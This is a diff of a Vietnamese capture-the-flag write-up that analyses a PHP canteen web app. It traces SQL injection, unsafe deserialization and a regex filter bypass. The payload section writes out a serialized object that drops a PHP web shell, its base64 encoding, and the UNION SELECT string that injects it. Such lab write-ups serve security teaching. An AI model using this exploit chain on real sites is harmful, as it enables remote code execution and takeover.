@@ -136,19 +136,19 @@ echo -e "fastcgi_param DB_NAME $DB_NAME;\nfastcgi_param DB_USER $DB_USER;\nfastc
 File trên dùng để bật và khởi tạo database, và kết nối giữa Web và DB để mà nguồn có thể chạy được.
 
 ở dòng 31 của đoạn code trên, mình có thấy 1 chuỗi text khá kì lạ:
-~~~
+```text
 YToyOntpOjA7czo1OiJQaXp6YSI7aToxO2Q6MC45OTt9
-~~~
+```
 
 Sau khi thử decode bằng base64 thì mình có 1 chuỗi PHP đã được Serialize như sau:
-~~~
+```text
 a:2:{i:0;s:5:"Pizza";i:1;d:0.99;}
-~~~
+```
 
 Và mình nghi ngờ rằng web này sẽ có lỗ hỏng ```PHP Deserialized```, qua đó mình cũng biết được dữ liệu của bảng ```food``` có 4 cột.
 
 ##### Model
-###### CanteenModel.php
+**CanteenModel.php**
 
 ```PHP
 <?php
@@ -225,7 +225,7 @@ class CanteenModel {
 
 Sau khi phân tích thì mình thấy hàm ```filterFood($price_param)``` trong CanteenModel thực hiện nối chuỗi trực tiếp:
 
-```PHP
+```text
 $sql = "SELECT * FROM food where price < " . $price_param;
 ```
 
@@ -233,20 +233,21 @@ Cho phép chúng ta sử dụng ```UNION SELECT``` để điều khiển dữ li
 
 Ngoài ra dữ liệu từ cột ```oldvalue``` sẽ đi thẳng vào:
 
-```PHP
+```text
 $uns_result = unserialize($dec_result);
 ```
 => Confirm lỗ hỏng là ```PHP Deserialization``` và ```SQL Injection```.
 
 Mặc dù đã có 1 lớp Regex chặn các đối tượng khởi đầu bằng ```O:\d+```:
-```PHP
+
+```text
 if (preg_match_all('/O:\d+:"([^"]*)"/', $dec_result, $matches)) {
       return 'Not allowed';
 }
 ```
 nhưng chúng ta có thể bypass bằng cách thêm dấu ```+``` vào độ dài của class. Ví dụ như ```O:+10:"AdminModel"```.
 
-###### AdminModel.php
+**AdminModel.php**
 
 ```PHP
 <?php
@@ -285,13 +286,13 @@ class LogFile {
 
 Nhìn vào đây mình thấy được ở hàm ```__construct($filename, $content)``` thì mình thấy lệnh sau:
 
-```PHP
+```text
 file_put_contents($filename, $content, FILE_APPEND);
 ```
 
 Mình nghĩ ngay đến ```RCE``` thông qua việc tạo 1 log file có đuôi ```.php``` với nội dung mà chúng ta có thể tuỳ chỉnh, nhưng vấn đề lớn ở đây là hàm ```__construct($filename, $content)``` của ```AdminModel```, nó sẽ set tên file và nội dung khi ta gọi ```new``` ở ```CanteenModel.php```:
 
-```PHP
+```text
 $log_entry = 'Access at: '. date('Y-m-d H:i:s') .   "<br>\n";
 $logger = new AdminModel("../logs.txt", $log_entry);
 ```
@@ -304,10 +305,10 @@ Khi chúng ta sử dụng hàm ```unserialize()```, nó sẽ bỏ qua hàm ```__
 
 Hiểu nôm na là:
 
-~~~
+```text
 - New sẽ như bạn tạo một nhân vật mới trong game thông qua Construct, dữ liệu sẽ hoàn toàn được tạo mới.
 - Unserialize sẽ như bạn load sẽ một nhân vật có sẵn, nó gọi thẳng Wakeup và dữ liệu sẽ được nhập vào DB.
-~~~
+```
 
 #### Hướng giải
 Sau khi phân tích source code đã đời thì mình sẽ thực hiện tấn công thông qua ```SQL INJECTION``` và ```PHP Deserialization```.
@@ -316,19 +317,19 @@ Sau khi phân tích source code đã đời thì mình sẽ thực hiện tấn 
 #### Payload
 Đầu tiên mình xây dựng 1 chuỗi PHP đã được serialize như sau:
 
-~~~
+```text
 a:3:{i:0;s:7:"SKIBIDI";i:1;s:1:"1";i:2;O:+10:"AdminModel":2:{s:8:"filename";s:9:"shell.php";s:10:"logcontent";s:30:"<?php system($_GET['cmd']); ?>";}}
-~~~
+```
 
 Sau đó encode nó với Base64:
 
-~~~
+```text
 YTozOntpOjA7czo3OiJTS0lCSURJIjtpOjE7czoxOiIxIjtpOjI7TzorMTA6IkFkbWluTW9kZWwiOjI6e3M6ODoiZmlsZW5hbWUiO3M6OToic2hlbGwucGhwIjtzOjEwOiJsb2djb250ZW50IjtzOjMwOiI8P3BocCBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsgPz4iO319
-~~~
+```
 
 Rồi mình xây dựng 1 payload SQL sử dụng ```UNION SELECT```:
 
-```SQL
+```text
 -1 UNION SELECT 1, 'test', 'YTozOntpOjA7czo3OiJTS0lCSURJIjtpOjE7czoxOiIxIjtpOjI7TzorMTA6IkFkbWluTW9kZWwiOjI6e3M6ODoiZmlsZW5hbWUiO3M6OToic2hlbGwucGhwIjtzOjEwOiJsb2djb250ZW50IjtzOjMwOiI8P3BocCBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsgPz4iO319', 4-- -
 ```
 
@@ -382,5 +383,6 @@ Magic method cũng là con dao 2 lưỡi (```__wakeup()```, ```__destruct()```),
 
 ### Lời kết
 Thôi thì bài writeup của mình cũng chỉ đến đây thôi =))) Chúc các bạn 1 ngày vui vẻ, mình ngủ đây.
+
 
 
